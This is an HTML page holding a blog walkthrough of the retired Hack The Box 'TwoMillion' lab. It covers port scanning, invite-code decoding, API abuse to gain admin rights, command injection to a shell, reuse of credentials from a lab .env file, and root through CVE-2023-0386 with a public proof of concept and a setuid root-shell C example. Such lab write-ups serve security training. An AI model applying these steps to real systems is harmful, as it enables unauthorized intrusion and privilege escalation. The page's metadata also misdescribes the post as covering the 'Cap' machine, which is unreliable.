<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HTB TwoMillion Walkthrough | From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya</title>
<meta name="keywords" content="Walkthrough, HTB, Linux, CVE-2023-0386, OverlayFS">
<meta name="description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">
<meta name="author" content="Bhavik Kanejiya">
<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://bhavik-kanejiya.github.io/android-chrome-192x192.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/">
  <meta property="og:site_name" content="From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya">
  <meta property="og:title" content="HTB TwoMillion Walkthrough">
  <meta property="og:description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2024-11-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-05T00:00:00+00:00">
    <meta property="article:tag" content="Walkthrough">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="CVE-2023-0386">
    <meta property="article:tag" content="OverlayFS">
    <meta property="og:image" content="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118171354.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118171354.png">
<meta name="twitter:title" content="HTB TwoMillion Walkthrough">
<meta name="twitter:description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://bhavik-kanejiya.github.io/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HTB TwoMillion Walkthrough",
      "item": "https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB TwoMillion Walkthrough",
  "name": "HTB TwoMillion Walkthrough",
  "description": "Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques",
  "keywords": [
    "Walkthrough", "HTB", "Linux", "CVE-2023-0386", "OverlayFS"
  ],
  "articleBody": "Box Info Attribute Details Level Easy OS Linux Box URL HTB-TwoMillion Box Status Retired About Box TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell. Footprinting Nmap nmap finds two open TCP ports, SSH (22) and HTTP (80):\n\u003e nmap -p- --min-rate 10000 10.10.11.221 Nmap 7.94SVN scan initiated Sat Jan 18 17:24:20 2025 as: nmap -p- --min-rate 10000 -oN 1.basic.nmap.txt 10.10.11.221 Nmap scan report for 10.10.11.221 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sat Jan 18 17:24:42 2025 -- 1 IP address (1 host up) scanned in 21.88 seconds \u003e nmap -sCV -p 22,80 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 17:35 IST Nmap scan report for 10.10.11.221 Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds Let’s add 10.10.11.221 host to our /etc/hosts file:\necho \"10.10.11.221 2million.htb\" | sudo tee -a /etc/hosts Port - 22 Enumeration We tried the same thing for SSH. We login into SSH anonymous but it’s also a failed attempt.\nssh anonymous@10.10.10.245 anonymous@10.10.10.245's password: Permission denied, please try again. Port - 80 Enumeration Response Headers HTTP/1.1 200 OK Server: nginx Date: Sun, 19 Jan 2025 08:32:05 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive Set-Cookie: PHPSESSID=srsk0h13obnn855016i953mfd7; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Technology Detection Application Overview The application resembles HTB’s old version from 2017. It includes pages such as Login, Invite, Hall of Fame, and FAQ.\nThe the old version of HTB requires an invitation code for the user Sign\nI tried to play with the invitation code option and observed that the application is calling the 2 Javascript files that are being used to send API requests. We tried to see what the both js file contains.\nObfuscated Code We found that the supposed to be inviteapi.min.js is responsible for sending the invitation validation request. The JavaScript file contains multiple keywords like POST, makeInviteCode, verifyInviteCode so looks like it is obfuscated.\nWe used de4js JavaScript Deobfuscator and Unpacker to get the JavaScript in Deobfuscated format.\nDeobfuscated JavaScript:\nfunction verifyInviteCode(code) { var formData = { code: code, }; $.ajax({ type: \"POST\", dataType: \"json\", data: formData, url: \"/api/v1/invite/verify\", success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } function makeInviteCode() { $.ajax({ type: \"POST\", dataType: \"json\", url: \"/api/v1/invite/how/to/generate\", success: function (response) { console.log(response); }, error: function (response) { console.log(response); }, }); } From the deobfuscated JavaScript we can see that the JavaScript contains 2 functions.\nFunction verifyInviteCode is responsible for verifying the Invitation code. Function makeInviteCode is responsible for generating the Invitation code. Generate Invitation Token Upon sending a POST request for How-to-Generate application returns the ROT13 encrypted string.\ncurl -X POST http://2million.htb/api/v1/invite/how/to/generate {\"0\":200,\"success\":1,\"data\":{\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr\",\"enctype\":\"ROT13\"},\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"} We have converted the ROT13 string to cleartext format and it gave a hint for another endpoint.\nIn order to generate the invite code, make a POST request to /api/v1/invite/generate Upon sending a POST request for Generate-invite application returns a base64 encoded string.\n\u003e curl -X POST http://2million.htb/api/v1/invite/generate {\"0\":200,\"success\":1,\"data\":{\"code\":\"ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\",\"format\":\"encoded\"}} We have converted the base64 encoded string to clear text format which gives us our invitation code.\n\u003e echo \"ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\" | base64 -d 0MEG4-BRSC3-HHYJD-S45QD Registration Page We have entered our invitation code and which allows us to login into application with our username and password.\nUser Dashboard We have login into the application and we saw very limited options. A few of them are:\nDashboard FAQ Generate the VPN Connection File Available API Endpoints The interesting part of generating a VPN connection file was, It is called the api/v1/user/vpn/download. We can get the list of API endpoints by calling the /api/v1.\nIt was observed that the application contains the admin API as well. Admin API contains 3 endpoints:\nGET - /api/v1/admin/auth : Check if user is admin or not POST - /api/v1/admin/vpn/generate : Generate VPN for specific user PUT - /api/v1/admin/settings/update : Update user settings Check User Admin Right Status Update the User Rights Update admin settings API returns the error message which shows that the API request is missing an email parameter.\nWe have added the email parameter and sent the request. It’s observed that the API request is missing the “is_admin” parameter. We have added the missing parameter and based on the response it’s observed that the User has now admin privilege. Admin Access Check Generate VPN File Command Execution It’s observed that generated VPN profile endpoint is vulnerable to command Injection. Shell as www-data To get the reverse shell, we are using the netcat command.\nVolia 🥳 We got the connection back to our terminal.\nLet’s Upgrade the shell:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl + z stty raw -echo; fg Get the User Flag Let’s cat the user flag…! Look like www-data user doesn’t have permission to view the file.\nwww-data@2million:/home/admin$ cat user.txt cat: user.txt: Permission denied List the Files, Directories and it’s permission:\nwww-data@2million:/home/admin$ ls -al total 32 drwxr-xr-x 4 admin admin 4096 Jun 6 2023 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. lrwxrwxrwx 1 root root 9 May 26 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 admin admin 220 May 26 2023 .bash_logout -rw-r--r-- 1 admin admin 3771 May 26 2023 .bashrc drwx------ 2 admin admin 4096 Jun 6 2023 .cache -rw-r--r-- 1 admin admin 807 May 26 2023 .profile drwx------ 2 admin admin 4096 Jun 6 2023 .ssh -rw-r----- 1 root admin 33 Jan 18 12:03 user.txt Shell as admin We tried few ways to login as admin. From hint, we found that the .env file contains the DB username and password.\nwww-data@2million:~/html$ ls -al total 56 drwxr-xr-x 10 root root 4096 Jan 18 15:20 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. -rw-r--r-- 1 root root 87 Jun 2 2023 .env -rw-r--r-- 1 root root 1237 Jun 2 2023 Database.php -rw-r--r-- 1 root root 2787 Jun 2 2023 Router.php drwxr-xr-x 5 root root 4096 Jan 18 15:20 VPN drwxr-xr-x 2 root root 4096 Jun 6 2023 assets drwxr-xr-x 2 root root 4096 Jun 6 2023 controllers drwxr-xr-x 5 root root 4096 Jun 6 2023 css drwxr-xr-x 2 root root 4096 Jun 6 2023 fonts drwxr-xr-x 2 root root 4096 Jun 6 2023 images -rw-r--r-- 1 root root 2692 Jun 2 2023 index.php drwxr-xr-x 3 root root 4096 Jun 6 2023 js drwxr-xr-x 2 root root 4096 Jun 6 2023 views Environment Variables:\nwww-data@2million:~/html$ cat .env DB_HOST=127.0.0.1 DB_DATABASE=htb_prod DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 We have the env variable file which contains the username and password. Let’s try to open the /etc/passwd file and see if does admin user exists in the system or not. It looks like the admin user does exist on the system.\nShell as admin We can log in as admin users who read the user flag.\nNow, Let’s jump for root flag 🚩\nShell as root From the hint, we get to know that the admin user has to do something with the mail system on Linux. We got the admin file under the mail directory which contains the mail from ch4p regarding the Patching System OS.\nFrom: ch4p To: admin Cc: g0blin Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: \u003c9876543210@2million.htb\u003e X-Mailer: ThunderMail Pro 5.2 Hey admin, I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that. HTB Godfather Failed Attempt We searched OverlayFS CVE and came across this article by ProjectDiscovery.\nWe got the access as the root user but still, it’s not a complete root permission.\nCVE-2023-0386 Analysis I started searching again and it’s observed that the machine is vulnerable to CVE-2023-0386.\nFrom Google: CVE-2023-0386 is a high-severity vulnerability in the Linux kernel’s overlayfs filesystem. Improper permission handling allows local attackers to easily escalate privileges to root, compromising the entire system.\nHow to Detect? The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the command uname -r\nA system is likely to be vulnerable if it has a kernel version lower than 6.2. We found that our Linux machine is running on 5.15\nadmin@2million:~$ uname -r 5.15.70-051570-generic Let’s understand what is SUID, OverlayFS…\nWhat is SUID bit? SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file’s owner.\nWhat is OverlayFS? Overlay filesystems, also known as “union filesystems” or “union mounts” let you mount a filesystem using 2 directories: a “lower” directory, and an “upper” directory.\n1. Structure OverlayFS uses three main components:\nLower directory: Read-only base layer containing the original files. Upper directory: Writable layer where changes are made. Merged view: The combined result of the lower and upper directories. 2. File Operations Read: If a file exists in both layers, the version in the upper layer is presented. If a file exists only in the lower layer, it is accessed from there. Write: If a file in the lower layer is modified, it is copied to the upper layer first (copy-on-write), and then the changes are applied to the copy. Delete: When a file in the lower layer is deleted, it is “hidden” by creating a whiteout marker in the upper layer. 3. Mounting Example Assume you have:\nLower layer: /lower Upper layer: /upper Mount point: /merged Command to create an overlay:\nmount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged How does the CVE-2023-0386 Works? Pretending to Have a Root-Owned File:\nThe attacker uses a trick called FUSE (a tool for making fake filesystems) to create a “fake” file that looks like: It’s owned by the system administrator (root). It has the SUID bit set, which means running this file will give whoever runs it admin-level privileges. Normally, creating such a file directly on the system isn’t allowed unless you’re already an admin. But with FUSE, you can fake it.\nCreate a Safe “Sandbox” Environment:\nThe attacker uses something called user namespaces to create a sandbox environment. This lets them temporarily do things (like mounting filesystems) that normally require admin permissions. Set Up the OverlayFS Trick:\nThe attacker sets up an OverlayFS filesystem: The lower directory (base layer) is the fake filesystem they made with FUSE. The upper directory (writable layer) is something like /tmp, where anyone can write files. Trigger the Kernel Bug:\nThe attacker “copies” the fake file (from the lower layer) to the writable layer (upper directory). When the kernel handles this copy, it believes the fake file’s permissions and creates a real file in /tmp that: Is owned by root. Has the SUID bit set. Escape the Sandbox and Exploit the File:\nThe attacker exits the sandbox and now has a real root-owned SUID file in /tmp. They execute this file to become root and take full control of the system. Code Example Here is the code example which I took from the Datadog article.\nThe code written in C will try to set setuid and setgid to root.\n#include #include #include #include #include int main(void) { int result; result = setuid(0); if (result != 0 ) { printf(\"could not setuid(0): %s\\n\", strerror(errno)); return result; } result = setgid(0); if (result != 0) { printf(\"could not setguid(0): %s\\n\", strerror(errno)); return result; } printf(\"Starting root shell...\\n\"); system(\"/bin/bash\"); return 0; } Since, to set the uid or gid to root, User requires the root permission. As per expectations, We can see the Operation not permitted error from the code.\njohn@machine:~$ gcc -Wall setuid.c -o setuid john@machine:~$ chmod +x setuid john@machine:~$ ./setuid could not setuid(0): Operation not permitted Here, User has changed the file’s user and group ownership to root and also assigned the SUID to the file.\nroot@machine:/home/john$ chown root:root setuid root@machine:/home/john$ chmod +s setuid Here, Lower privilege user John executed the file and since setuid file contains the SUID permission, at the end of file execution John was able to get the Root Shell.\njohn@machine:~$ ./setuid Starting root shell... root@machine:~$ id uid=0(root) gid=0(root) groups=0(root),1002(john) Geting Root Flag I was using the POC for CVE-2023-0398 created by xkaneikiwhich is already available on Github.\nCommands:\nmake all ./fuse ./ovlcap/lower ./gc \u0026 ./exp We have the root flag.\nWe also have thank you message from HTB team. Let’s try to read the message.\nThank You Message from HTB Team Final Thank You Message Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team References https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ https://github.com/xkaneiki/CVE-2023-0386 https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ Connect with Me LinkedIn Twitter GitHub Hack The Box ",
  "wordCount" : "2537",
  "inLanguage": "en",
  "image":"https://bhavik-kanejiya.github.io/images/HTB/TwoMillion/Pasted%20image%2020250118171354.png","datePublished": "2024-11-05T00:00:00Z",
  "dateModified": "2024-11-05T00:00:00Z",
  "author":[{
    "@type": "Person",
    "name": "Bhavik Kanejiya"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya",
    "logo": {
      "@type": "ImageObject",
      "url": "https://bhavik-kanejiya.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://bhavik-kanejiya.github.io/" accesskey="h" title="Home (Alt + H)">
                <img src="https://bhavik-kanejiya.github.io/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://bhavik-kanejiya.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      HTB TwoMillion Walkthrough
    </h1>
    <div class="post-meta"><span title='2024-11-05 00:00:00 +0000 UTC'>November 5, 2024</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Bhavik Kanejiya

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#box-info" aria-label="Box Info">Box Info</a></li>
                <li>
                    <a href="#footprinting" aria-label="Footprinting">Footprinting</a><ul>
                        
                <li>
                    <a href="#nmap" aria-label="Nmap">Nmap</a></li></ul>
                </li>
                <li>
                    <a href="#port---22-enumeration" aria-label="Port - 22 Enumeration">Port - 22 Enumeration</a></li>
                <li>
                    <a href="#port---80-enumeration" aria-label="Port - 80 Enumeration">Port - 80 Enumeration</a><ul>
                        
                <li>
                    <a href="#response-headers" aria-label="Response Headers">Response Headers</a></li>
                <li>
                    <a href="#technology-detection" aria-label="Technology Detection">Technology Detection</a></li>
                <li>
                    <a href="#application-overview" aria-label="Application Overview">Application Overview</a></li>
                <li>
                    <a href="#obfuscated-code" aria-label="Obfuscated Code">Obfuscated Code</a></li>
                <li>
                    <a href="#generate-invitation-token" aria-label="Generate Invitation Token">Generate Invitation Token</a></li>
                <li>
                    <a href="#registration-page" aria-label="Registration Page">Registration Page</a></li></ul>
                </li>
                <li>
                    <a href="#user-dashboard" aria-label="User Dashboard">User Dashboard</a><ul>
                        
                <li>
                    <a href="#available-api-endpoints" aria-label="Available API Endpoints">Available API Endpoints</a></li>
                <li>
                    <a href="#check-user-admin-right-status" aria-label="Check User Admin Right Status">Check User Admin Right Status</a></li>
                <li>
                    <a href="#update-the-user-rights" aria-label="Update the User Rights">Update the User Rights</a><ul>
                        
                <li>
                    <a href="#admin-access-check" aria-label="Admin Access Check">Admin Access Check</a></li>
                <li>
                    <a href="#generate-vpn-file" aria-label="Generate VPN File">Generate VPN File</a></li></ul>
                </li>
                <li>
                    <a href="#command-execution" aria-label="Command Execution">Command Execution</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-www-data" aria-label="Shell as www-data">Shell as www-data</a><ul>
                        
                <li>
                    <a href="#get-the-user-flag" aria-label="Get the User Flag">Get the User Flag</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-admin" aria-label="Shell as admin">Shell as admin</a><ul>
                        
                <li>
                    <a href="#shell-as-admin-1" aria-label="Shell as admin">Shell as admin</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-root" aria-label="Shell as root">Shell as root</a><ul>
                        
                <li>
                    <a href="#failed-attempt" aria-label="Failed Attempt">Failed Attempt</a></li>
                <li>
                    <a href="#cve-2023-0386-analysis" aria-label="CVE-2023-0386 Analysis">CVE-2023-0386 Analysis</a><ul>
                        
                <li>
                    <a href="#how-to-detect" aria-label="How to Detect?">How to Detect?</a></li>
                <li>
                    <a href="#what-is-suid-bit" aria-label="What is SUID bit?">What is SUID bit?</a></li>
                <li>
                    <a href="#what-is-overlayfs" aria-label="What is OverlayFS?">What is OverlayFS?</a><ul>
                        
                <li>
                    <a href="#1-structure" aria-label="1. Structure">1. Structure</a></li>
                <li>
                    <a href="#2-file-operations" aria-label="2. File Operations">2. File Operations</a></li>
                <li>
                    <a href="#3-mounting-example" aria-label="3. Mounting Example">3. Mounting Example</a></li></ul>
                </li>
                <li>
                    <a href="#how-does-the-cve-2023-0386-works" aria-label="How does the CVE-2023-0386 Works?">How does the CVE-2023-0386 Works?</a></li>
                <li>
                    <a href="#code-example" aria-label="Code Example">Code Example</a></li></ul>
                </li>
                <li>
                    <a href="#geting-root-flag" aria-label="Geting Root Flag">Geting Root Flag</a></li>
                <li>
                    <a href="#thank-you-message-from-htb-team" aria-label="Thank You Message from HTB Team">Thank You Message from HTB Team</a><ul>
                        
                <li>
                    <a href="#final-thank-you-message" aria-label="Final Thank You Message">Final Thank You Message</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#references" aria-label="References">References</a></li>
                <li>
                    <a href="#connect-with-me" aria-label="Connect with Me">Connect with Me</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="box-info">Box Info<a hidden class="anchor" aria-hidden="true" href="#box-info">#</a></h2>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118171354.png"></p>
<table>
  <thead>
      <tr>
          <th><strong>Attribute</strong></th>
          <th><strong>Details</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Level</strong></td>
          <td>Easy</td>
      </tr>
      <tr>
          <td><strong>OS</strong></td>
          <td>Linux</td>
      </tr>
      <tr>
          <td><strong>Box URL</strong></td>
          <td><a href="https://www.hackthebox.com/machines/twomillion">HTB-TwoMillion</a></td>
      </tr>
      <tr>
          <td><strong>Box Status</strong></td>
          <td>Retired</td>
      </tr>
      <tr>
          <td><strong>About Box</strong></td>
          <td>TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</td>
      </tr>
  </tbody>
</table>
<h2 id="footprinting">Footprinting<a hidden class="anchor" aria-hidden="true" href="#footprinting">#</a></h2>
<h3 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
<p><code>nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; nmap -p- --min-rate <span class="m">10000</span> 10.10.11.221
</span></span><span class="line"><span class="cl">Nmap 7.94SVN scan initiated Sat Jan <span class="m">18</span> 17:24:20 <span class="m">2025</span> as: nmap -p- --min-rate <span class="m">10000</span> -oN 1.basic.nmap.txt 10.10.11.221
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.221
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.22s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Jan 18 17:24:42 2025 -- 1 IP address (1 host up) scanned in 21.88 seconds</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; nmap -sCV -p 22,80 10.10.11.221
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-18 17:35 IST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.221
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.22s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://2million.htb/
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.78 seconds
